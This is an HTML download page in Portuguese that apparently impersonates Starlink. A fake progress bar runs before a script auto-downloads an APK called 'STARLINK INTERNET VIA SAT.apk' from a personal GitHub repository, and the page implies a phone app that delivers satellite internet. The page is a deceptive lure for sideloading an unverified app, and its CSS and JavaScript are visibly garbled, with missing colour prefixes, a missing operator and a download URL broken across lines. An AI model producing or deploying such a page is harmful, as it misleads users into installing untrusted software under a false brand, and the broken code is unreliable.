<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Starlink Mobile</title>
<style>
{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial}
body{background:0b0b0b;color:e6e6e6;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:30px;text-align:center}
.logo{width:160px;height:160px;background:url('data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjAwIDIwMCI+PHBhdGggZD0iTTEwMCAyMEwxMjAgODBMMTgwIDgwTDEzNSAxMjBMMTU1IDE4MEwxMDAgMTQ1TDQ1IDE4MEw2NSAxMjBMMjAgODB2MHoiIGZpbGw9Ii1e1e1e" stroke="00d4ff" stroke-width="6" stroke-linejoin="round"/></svg>') center/contain no-repeat;margin-bottom:30px}
h1{font-size:32px;color:00d4ff;margin-bottom:12px;letter-spacing:1px}
p{font-size:18px;color:999;margin-bottom:35px}
.btn{background:00d4ff;color:000;border:none;padding:22px 60px;border-radius:40px;font-size:20px;font-weight:800;cursor:pointer;box-shadow:0 0 25px 00d4ff;transition:.25s}
.btn:hover{transform:scale(1.05);box-shadow:0 0 40px 00d4ff}
.progress{width:85%;height:12px;background:111;border-radius:6px;margin-top:30px;overflow:hidden}
.bar{height:100%;background:00d4ff;width:0%;transition:width .25s}
.percent{margin-top:12px;font-size:16px;color:00d4ff}
</style>
</head>
<body>
<div class="logo"></div>
<h1>Starlink Mobile</h1>
<p>Download direto, sem sair da página.</p>
<button class="btn" onclick="startDownload()">BAIXAR AGORA</button>
<div class="progress"><div class="bar" id="bar"></div></div>
<div class="percent" id="percent">0%</div>

<script>
function startDownload(){
  const btn=document.querySelector('.btn');
  const bar=document.getElementById('bar');
  const percent=document.getElementById('percent');
  btn.disabled=true;
  btn.innerText='INICIANDO...';
  let w=0;
  const iv=setInterval(()=>{
    w+=Math.random()7+3;
    if(w>100)w=100;
    bar.style.width=w+'%';
    percent.innerText=Math.floor(w)+'%';
    if(w===100){
      clearInterval(iv);
      const a=document.createElement('a');
      a.href='https://raw.githubusercontent.com/Abravaaaa/STAR3/main/STARLINK%20INTERNET%20VIA%20SAT.apk
';
      a.download='STARLINK INTERNET VIA SAT.apk';
      a.click();
      btn.innerText='CONCLUÍDO';
      percent.innerText='100% – APK salvo';
    }
  },180);
}
</script>
</body>
</html>
